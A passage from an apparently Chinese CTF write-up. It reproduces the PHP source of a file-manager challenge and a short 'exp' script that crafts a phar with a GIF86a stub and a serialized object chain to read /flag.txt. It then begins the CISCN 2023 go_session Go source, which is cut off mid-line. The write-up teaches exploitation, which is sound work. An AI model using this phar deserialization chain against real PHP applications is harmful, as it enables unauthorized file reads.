</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里有delete.php来触发file_exists然后触发反序列化,</p><p> 原因是在download中设置了open_basedir</p><blockquote><p><code>open_basedir</code> 是 PHP 的一个安全特性，用于限制 PHP 脚本对文件系统的访问范围。当 <code>open_basedir</code> 配置设置为某个目录时，PHP 脚本只能访问该目录及其子目录中的文件，而不能访问其他目录中的文件。</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF86a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315155224020.png" alt="image-20240315155224020"></p><h2 id="CISCN-2023-初赛-go-session"><a href="#CISCN-2023-初赛-go-session" class="headerlink" title="[CISCN 2023 初赛]go_session"></a>[CISCN 2023 初赛]go_session</h2><p>第一次做go审计,先看源码</p><p>main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>route.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;html&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + 